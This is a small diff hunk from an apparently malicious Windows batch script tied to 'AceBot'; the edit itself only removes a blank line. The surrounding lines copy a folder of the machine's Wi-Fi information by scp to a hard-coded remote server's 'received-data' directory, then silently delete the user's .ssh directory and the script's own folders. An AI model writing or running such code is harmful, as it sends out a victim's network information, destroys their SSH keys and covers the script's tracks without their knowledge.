@@ -47,7 +47,6 @@ timeout /t 1 /nobreak > NUL
 scp -rp %ssid%-wifiinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
 timeout /t 1 /nobreak > NUL
 
-
 rmdir /s /q c:\\Users\\%userName%\\.ssh
 timeout /t 1 /nobreak > NUL
 rmdir /s /q c:\\Users\\%userName%\\AceBot-script\\AceBot-Boot-Zone
